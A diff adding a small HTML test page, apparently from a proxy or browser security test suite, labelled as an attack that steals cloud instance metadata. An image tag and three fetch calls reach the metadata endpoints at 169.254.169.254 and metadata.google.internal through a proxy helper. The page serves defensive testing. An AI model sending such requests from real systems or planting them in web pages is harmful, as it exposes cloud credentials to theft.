@@ -1,0 +1,10 @@
+<!doctype html><html lang="lo"><meta charset="utf-8"><title>ສິນຄ້າ</title><script src="rt.js"></script>
+<h1>ສິນຄ້າ</h1><p>Attack: steal cloud instance metadata (where cloud credentials live).</p>
+<img src="http://169.254.169.254/v1/user-data" alt="">
+<script>
+rtDone([
+  rt('fetch Vultr metadata http://169.254.169.254/v1.json', () => fetch('http://169.254.169.254/v1.json').then(viaProxy)),
+  rt('fetch AWS-style http://169.254.169.254/latest/meta-data/', () => fetch('http://169.254.169.254/latest/meta-data/').then(viaProxy)),
+  rt('fetch http://metadata.google.internal/', () => fetch('http://metadata.google.internal/').then(viaProxy)),
+]);
+</script></html>
